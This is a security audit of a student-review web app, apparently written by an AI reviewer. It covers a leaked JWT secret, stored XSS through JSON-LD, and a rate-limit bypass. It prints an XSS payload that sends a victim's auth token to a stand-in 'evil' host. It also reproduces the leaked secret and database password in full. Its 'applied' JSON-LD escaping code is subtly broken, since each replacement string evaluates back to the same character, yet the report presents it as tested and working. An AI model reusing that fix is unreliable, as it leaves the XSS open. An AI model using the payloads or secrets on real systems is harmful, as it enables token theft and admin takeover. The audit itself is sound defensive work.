# CurtinHonestly Security Audit — August 2026

**Scope:** Angular SSR frontend + admin frontend, Spring Boot / PostgreSQL backend, deployed on Azure Static Web Apps + Container Apps.
**Reviewer:** automated deep audit (Claude), branch `security/audit-2026-08-remediation`.
**Method:** full read of the auth/authz/review/campaign/admin/rate-limit layers, the SSR SEO rendering path, secret handling, git history, and CI/deploy config. Skeptical, exploit-first.

Overall the codebase is in good shape: JPA is used with parameterised queries throughout (no native SQL, no string-built queries), Angular template binding escapes all user content in the DOM, password storage is bcrypt, verification/reset tokens are 256-bit, SHA-256-hashed, single-use and TTL-bounded, and admin endpoints are gated server-side. The findings below are the real gaps.

---

## Severity summary

| # | Severity | Finding | Status |
|---|----------|---------|--------|
| 1 | **Critical** | JWT signing secret (and DB password) committed to a **public** git history; forgeable admin tokens if still in use | Fixed-in-code already; **Devon must rotate** |
| 2 | **Critical** | Stored XSS via JSON-LD `reviewBody` in prerendered/SSR HTML | **Fixed** on this branch |
| 3 | **High** | Rate-limit bypass via spoofable `X-Forwarded-For` (defeats login/reset/register/visit limits) | **Fixed** on this branch |
| 4 | **Medium** | Password reset does not invalidate existing JWTs (up to 7-day window) | Flagged (fix deferred, needs schema) |
| 5 | **Medium** | Verification-confirm token travels in URL query string; auto-logs-in | Flagged |
| 6 | **Low** | `isTipOwner` repeats the old `instanceof UserDetails` bug — denies every non-admin tip owner (fail-closed) | **Fixed** on this branch |
| 7 | **Low** | Account enumeration on `/auth/register` ("email already registered") | Flagged |
| 8 | **Low** | No minimum password length on registration (reset enforces 8) | **Fixed** on this branch |
| 9 | **Low** | `professor` review field has no length bound (storage/DoS) | **Fixed** on this branch |
| 10 | **Info** | Actuator on classpath; keep web exposure to `health` only | Hardening note |

---

## 1. Critical — Signing secret committed to public git history

**Files:** git history of `backend/src/main/resources/application.yml` (removed in commit `0eed46b`, still present in commits `bf450b0` / `a69aa39`). Current file at `backend/src/main/resources/application.yml:54` correctly reads `jwt.secret: ${jwt-secret:?...}`.

**What's exposed:** the repository `https://github.com/devon-clarkk/CurtinHonestly.git` is **PUBLIC** (`gh repo view` → `PUBLIC`). Its history contains:
- `jwt.secret: tG4Mz8q7Rs2Lp9FnXKp7dWsYmYeTb4H3`
- datasource `password: CurtinHonestly`

**Concrete exploit:** the JWT filter authenticates by the token's `subject` and then loads authorities from the DB for that email (`JwtAuthenticationFilter.java:42-55`, `UserDetailsServiceImpl.java`). So anyone who knows the HS256 secret can mint a token with `subject = <any admin's email>` and immediately gets `ROLE_ADMIN` — full admin takeover (delete users/reviews/units, read every user's email, dump campaign entrants). The secret is public. If the production `JWT_SECRET` env var is still `tG4Mz8q7...`, the site is compromised right now.

**Fix (code):** already done in `0eed46b` — the secret is no longer in source and is required from env. Nothing to change in code.

**Devon action items (cannot be done from code):**
1. **Rotate `JWT_SECRET` in prod (and dev) to a fresh 256-bit random value** — e.g. `openssl rand -base64 48`. Rotating invalidates all existing tokens (acceptable; users log in again). Do this even if you think prod already uses a different value, because you cannot prove the exposed one was never deployed.
2. **Rotate the database password** `CurtinHonestly` if it was ever the real prod/dev credential.
3. Optional but recommended: purge the secrets from history (`git filter-repo`) or accept that they are permanently public and rely on rotation. Rotation is the load-bearing step.

---

## 2. Critical — Stored XSS via JSON-LD in server-rendered HTML

**Files:** `frontend/src/app/services/seo.service.ts:128-140` (`setJsonLd`), `frontend/src/app/utils/unit-seo.utils.ts:69-87` (`buildReviewJsonLd` → `reviewBody: review.reviewText.trim()`), invoked unconditionally from `frontend/src/app/components/unit-detail/unit-detail.component.ts:189` during data load. Unit pages are `RenderMode.Prerender` (`frontend/src/app/app.routes.server.ts`), so this runs at build/SSR time with live review data.

**The sink:**
```ts
script.textContent = JSON.stringify(data);   // data.reviewBody = attacker's reviewText
```

**Why it's exploitable:** in the browser, assigning `.textContent` is inert (no re-parse). The danger is the **server-side render**. `<script>` is a *raw-text* HTML element: a conformant HTML serializer emits its text content **verbatim, without entity-encoding**, because entities inside raw-text elements are not decoded by parsers. `JSON.stringify` does **not** escape `<`, `>`, or `/`. So a review whose text contains:

```
</script><img src=x onerror="fetch('//evil/?c='+localStorage.auth_token)">
```

is serialized literally into the prerendered `units/<CODE>/index.html`. When any visitor loads that page, their parser closes the JSON-LD `<script>` early and executes the injected markup. This is **stored XSS affecting every visitor** of the poisoned unit page, and the auth JWT lives in `localStorage` (`auth.service.ts:145`), so it is directly exfiltratable. `reviewText` allows 2000 chars (`ReviewCreateRequest`), far more than a payload needs, and the profanity filter does not strip HTML.

Note the mechanism does not depend on which DOM library Angular 21 uses — raw-text serialization is required by the HTML spec, which is exactly why the fix must happen in the JSON string.

**Confirmation:** confirmed by mechanism (spec-level). I could not observe the prod-built artifact directly because the checked-in `frontend/dist` is a dev build (`seoEnabled=false`, so `setJsonLd` is short-circuited and no unit pages are prerendered locally). On a prod build (`SITE_URL` set, `unit-codes.json` populated), the path runs.

**Fix (code, applied):** a new `serializeJsonLd` helper (`unit-seo.utils.ts`) escapes the three HTML-significant characters in the serialized JSON before it is assigned to `textContent`. A JSON parser decodes `<` back to `<` for JSON-LD consumers, while the raw HTML string no longer contains `</script>`:
```ts
export function serializeJsonLd(data: unknown): string {
  return JSON.stringify(data)
    .replace(/</g, '\u003c')
    .replace(/>/g, '\u003e')
    .replace(/&/g, '\u0026');
}
```
`&` is escaped so the sequence can't be reconstituted via an entity; `<`/`>` are the actual breakout characters. (U+2028/U+2029 don't need escaping here: they are legal inside JSON strings, and this output is parsed as JSON-LD, not as an ECMAScript literal.) Regression tests added asserting a `</script>` payload, both directly and carried through `buildUnitJsonLd`, never appears literally in the output.

---

## 3. High — Rate-limit bypass via spoofable `X-Forwarded-For`

**File:** `backend/src/main/java/com/curtinhonestly/backend/security/RateLimitFilter.java:84-90`.

```java
String forwardedFor = request.getHeader("X-Forwarded-For");
if (forwardedFor != null && !forwardedFor.isBlank()) {
    return forwardedFor.split(",")[0].trim();   // leftmost = client-controlled
}
```

**Exploit:** the rate-limit key is `clientIp + ":" + path`. The leftmost `X-Forwarded-For` value is whatever the client sends — a proxy *appends* the real IP to the right, it does not overwrite the left. So an attacker sets `X-Forwarded-For: <random>` on each request and every request keys to a distinct bucket, giving **unlimited** requests. This defeats *all* the auth protections that motivate this filter: login credential-stuffing (10/min), password-reset and verification email bombing (5/10min), registration bot signups, and referral visit-count inflation.

**Fix (code, applied), made fail-safe:** resolve the client IP from the right of the `X-Forwarded-For` chain using a configurable trusted-hop count (`app.ratelimit.trusted-proxy-count`, default `1` for the single Container Apps ingress hop), and fall back to `getRemoteAddr()` whenever the resolved value is blank or the header is absent. Failing safe matters: if the hop count is wrong the worst case is that traffic keys on the ingress IP (over-throttling), never silent bypass. Test added proving a spoofed leftmost XFF no longer changes the key.

**Assumption to verify (Devon):** the fix relies on the ingress *appending* the real client IP to the right of any client-supplied `X-Forwarded-For` (the standard behaviour, and what Container Apps ingress does). If a proxy instead forwarded a client-supplied header untouched, the rightmost entry would be attacker-controlled. The unit test constructs the header itself, so it proves the code handles the assumed shape but cannot prove the platform produces it. Confirm once on dev: send a request with a forged `X-Forwarded-For: 1.1.1.1` and check which value the app resolves (log it, or observe the rate-limit bucket). If the platform passes the client header through, set `app.ratelimit.trusted-proxy-count=0` so the socket address is used. This is a config change, no redeploy of code needed.

**Note:** the limiter is in-memory per replica (`RateLimiter.java` comment). With more than one backend replica the limits are per-instance; a shared store (Redis) would be needed for correctness at scale. Out of scope for this pass — noted.

---

## 4. Medium — Password reset / email change does not invalidate existing sessions

**Files:** `VerificationService.resetPassword` (`:154-178`), `UserService.updateEmail` (`:90-115`). JWTs are stateless with a 7-day TTL (`JwtUtil.java:24`) and authorities are re-read from the DB per request, but there is no per-user "credentials changed at" check.

**Exploit:** a user who resets their password after a device theft or token leak does not actually cut off the attacker — the previously issued JWT remains valid for up to 7 days. The reset gives false assurance.

**Fix (deferred — needs schema):** add `tokensValidAfter` (timestamp) to `User`, stamp it on password reset / email change, and reject tokens issued before it in `JwtAuthenticationFilter`. This requires a Flyway migration and a domain change, so it is flagged rather than applied in this Critical/High remediation pass. Recommend as the next security ticket.

---

## 5. Medium — Verification-confirm token in URL, auto-login

**Files:** `AuthController.confirmStudentVerification` (`:145-154`) — `GET /auth/verify-student/confirm?token=...` returns a fresh JWT; email body builds `/verify-student/confirm?token=<raw>` (`VerificationService.java:189`).

**Risk:** tokens in URLs leak via `Referer` headers (to any third-party asset on the landing page), browser history, and proxy/server logs. Because confirming also **logs the user in** (issues a JWT), a leaked-then-still-unused token grants a session. Mitigated by single-use + 256-bit entropy + 24h TTL, so exposure is low, but the pattern is worth changing: prefer POST-on-confirm from the SPA (token in body) or invalidate immediately and never echo a session token from a GET.

**Fix:** flagged, not changed (product-flow decision).

---

## 6. Low — `isTipOwner` denies every non-admin tip owner (same bug the review path just fixed)

**File:** `backend/src/main/java/com/curtinhonestly/backend/service/UnitTipSecurityService.java:15-27`.

```java
public boolean isTipOwner(String tipId, Object principal) {
    if (principal instanceof UserDetails) { ... }   // never true
    return false;
}
```

The SpEL `IS_ADMIN_OR_TIP_OWNER` passes `authentication` (a `UsernamePasswordAuthenticationToken`), which is **not** a `UserDetails`, so the `instanceof` is always false and the method always returns `false`. This is the identical mistake `ReviewSecurityService` documents having fixed. Effect: `DELETE /units/{code}/tips/{tipId}` returns 403 for every non-admin, so a user **cannot delete their own tip** (admins still can).

This fails **closed** — it is a correctness/availability bug, not an unauthorized-access vulnerability. Rated Low accordingly, but it lives squarely in the ownership-check area under audit and the fix mirrors the review path.

**Fix (code, applied):** read the username off `authentication.getName()` (matching `ReviewSecurityService`), compare to the tip's author email; anonymized tips (null user) remain unclaimable. Tests added: owner can delete, other user gets 403, admin can delete.

---

## 7. Low — Account enumeration on registration

**File:** `UserService.createUser:40-42` → `"That email is already registered."` surfaced via `GlobalExceptionHandler` as a 400. Lets an attacker probe which emails have accounts. `forgot-password` is correctly enumeration-safe (`AuthController:156-162`); registration is not. Low impact for a student-review site; flagged for awareness. (Left as-is to preserve the clear signup UX; the privacy trade-off is Devon's call.)

---

## 8. Low — No minimum password length at registration

**File:** `AuthController.RegisterRequest` (`:171`) — `@NotBlank String password` only. A user can register with a 1-character password, while `VerificationService.resetPassword` enforces 8 (`:36,155`). Inconsistent and weak.

**Fix (code, applied):** add `@Size(min = 8)` to the registration password to match the reset policy.

---

## 9. Low — Unbounded `professor` field

**Files:** `ReviewCreateRequest` / `ReviewUpdateRequest` — `String professor` has no `@Size`. Every other free-text field is bounded (`reviewText` 2000, tip 200, note 500). Unbounded storage / minor DoS vector.

**Fix (code, applied):** `@Size(max = 200)` on `professor` in both `ReviewCreateRequest` and `ReviewUpdateRequest`. 200 (not a tighter cap) and applied identically on create and update so that an already-stored long professor string can never make a review un-editable — a create-only or tighter bound would 400 a legitimate edit of pre-existing data.

---

## 10. Info — Actuator hardening

`spring-boot-starter-actuator` is on the classpath (`backend/build.gradle:30`). `SecurityConfig` permits only `/actuator/health`; all other actuator paths fall through to `.anyRequest().authenticated()`, and Spring Boot's default web exposure is `health` only, so nothing sensitive is exposed today. Keep it that way: do not set `management.endpoints.web.exposure.include=*`, and if more endpoints are ever exposed, gate them behind `ROLE_ADMIN` explicitly.

---

## Things checked and found sound (no action)

- **SQL injection:** no native queries; all `@Query` are JPQL with named params; filtering uses JPA Specifications (`UnitSpecification`). No string-concatenated SQL.
- **XSS in the DOM:** no `innerHTML`, no `bypassSecurityTrust*`, no `DomSanitizer` bypass anywhere in either frontend. Review/tip/professor text renders through Angular interpolation (`{{ }}`), which HTML-escapes. Newline rendering uses CSS `white-space: pre-line` (`unit-detail.component.css:379`), not markup injection — safe. (The one exception is the JSON-LD path, finding #2.)
- **Review ownership (the reported bug):** `ReviewSecurityService.isReviewOwner` is correct — it compares `authentication.getName()` to the review author's email and returns true only for the actual owner; it did **not** over-correct into letting the wrong user edit. `#id` in the SpEL matches the `@PathVariable String id`. Verified by added tests (owner edits/deletes, other user 403, admin allowed).
- **Anonymity of reviews:** public DTOs (`ReviewDTO`, `MyReviewDTO`, `UnitDetailsDTO`, `TipDTO`) expose only a `reviewerVerified`/`authorVerified` boolean and never the author email or user id. Author email appears only in `AdminReviewDTO` / `CampaignEntryAdminDTO`, both behind `ROLE_ADMIN`. No public endpoint leaks reviewer identity.
- **Admin authz:** `/admin/**` requires `ROLE_ADMIN` in `SecurityConfig` *and* the controller carries a class-level `@PreAuthorize`. `GET /reviews`/`/reviews/**` and `/users`/`/users/**` are admin-gated; `/reviews/me` and `/users/me/completed-units` are correctly carved out first (first-match-wins ordering is right).
- **Ban enforcement:** `UserDetailsServiceImpl` sets `enabled = !banned` and the JWT filter re-checks `userDetails.isEnabled()` on every request, so a ban takes effect immediately rather than at token expiry. Authorities always come from the DB, never the token's `roles` claim — good.
- **Password hashing:** `BCryptPasswordEncoder`. `password` is `@JsonIgnore` on the entity.
- **Token flows:** 256-bit `SecureRandom` raw tokens, stored only as SHA-256 hashes, single-use (`usedAt`), TTL-bounded (24h verify / 1h reset), outstanding tokens invalidated on reissue, ownership re-checked at confirm time. Forgot-password is enumeration-safe.
- **CORS:** exact-origin allowlist per environment (`application.yml` / `application-prod.yml`), no wildcard origin. `allowCredentials(true)` is unnecessary (auth is a Bearer header, not cookies) but not exploitable with an exact allowlist.
- **Error handling:** `GlobalExceptionHandler` returns generic messages and logs stack traces server-side; unexpected exceptions never leak internals to clients.
- **SPA fallback / 404 fix:** `staticwebapp.config.json` `navigationFallback` rewrites unknown routes to `index.html` with a static-asset exclude list and `X-Content-Type-Options: nosniff`. No path traversal or source exposure introduced.
- **Prod-build SEO generator:** `frontend/scripts/generate-seo-assets.js` (runs in the same prod build pipeline as finding #2) emits only `robots.txt` and `sitemap.xml`. The sitemap contains just `<loc>` URLs built from `encodeURIComponent(code)` and `lastmod` dates — no review text, professor, or other user-controlled content reaches the output, so it is not an injection sink. `fetch-unit-codes.js` likewise pulls only unit codes.
- **Campaign / referral abuse:** admin-only creation is enforced (`AdminResource` under `ROLE_ADMIN`); `landingPath` is normalised to a site-relative path (rejects `://` and `//`, strips query/fragment) so a referral link can't be turned into an open redirect; the redemption race is closed with a `SELECT … FOR UPDATE` row lock; entry-token collisions are retried. Visit endpoint is IP-rate-limited (subject to finding #3).

---

## What was changed on this branch (Critical + High + cheap Lows)

Code fixes applied:
- **#2** JSON-LD escaping via new `serializeJsonLd` in `unit-seo.utils.ts`, wired into `seo.service.ts` + regression tests.
- **#3** `X-Forwarded-For` right-of-chain resolution with trusted-hop config (`app.ratelimit.trusted-proxy-count`, default 1), fail-safe fallback + tests.
- **#6** `isTipOwner` corrected + ownership tests (review and tip).
- **#8** registration password `@Size(min = 8)`.
- **#9** `professor` `@Size(max = 200)` on create and update.

**Test status:** 18 targeted backend unit tests green (8 `RateLimitFilterTest` including the two new XFF-spoofing cases, 5 `ReviewSecurityServiceTest`, 5 `UnitTipSecurityServiceTest`); 41 frontend `unit-seo.utils.spec.ts` green. Three `@SpringBootTest` integration tests (`ApplicationTests.contextLoads`, `ReviewLikeCampaignTest`, `ReviewOrderingTest`) could not run in this environment — they fail on `password authentication failed for user "postgres"` (a Testcontainers/local-DB wiring issue), and fail identically on the clean base with the changes stashed, so they are pre-existing and not regressions. Devon should confirm they pass in CI before promoting.

Committed, **not deployed**. Deployment is Devon's dev→main promotion.

## Devon action items (cannot be fixed in code)

1. **Rotate `JWT_SECRET`** in prod and dev to a fresh 256-bit random value (finding #1). Highest priority.
2. **Rotate the DB password** if `CurtinHonestly` was ever a real credential (finding #1).
3. Decide on **finding #4** (session invalidation on password reset) — recommend scheduling as the next security ticket (needs a Flyway migration).
4. Decide on **findings #5 and #7** (token-in-URL flow, registration enumeration) — product/UX trade-offs.
5. **Verify the `X-Forwarded-For` shape on dev** (finding #3) and set `app.ratelimit.trusted-proxy-count` accordingly (0 if the ingress does not append). One-time check.
6. Consider a shared rate-limit store (Redis) if the backend ever runs more than one replica (finding #3 note).
